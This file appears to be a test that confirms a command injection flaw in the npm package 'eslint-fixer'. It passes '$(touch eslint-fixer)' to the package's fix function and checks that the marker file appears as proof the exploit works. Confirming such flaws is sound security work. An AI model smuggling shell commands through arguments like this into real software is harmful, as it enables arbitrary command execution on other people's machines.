// newpath = "eslint-fixer"
// 	fs.unlink(path, function(err) {})



test("Command Injection in eslint-fixer", () => 
{
    const fix = require("eslint-fixer");
	const fs = require('fs')
	const path = './eslint-fixer'
	const sleep = require('sleep');
    
    //checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);

    try
    {
        fix("$(touch eslint-fixer)");  // creating the file as a proof of exploit
    }
    catch
    {
            
    }
    finally
    {
    
    }
	sleep.sleep(7);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

    fs.unlink(path, function(err) {

        if (err) {
            throw err;
            console.log("\n\nfailed deleted the file.\n\n")
          } else {
            console.log("\n\nSuccessfully deleted the file.\n\n")
          }
    })//deleting the file

});
    
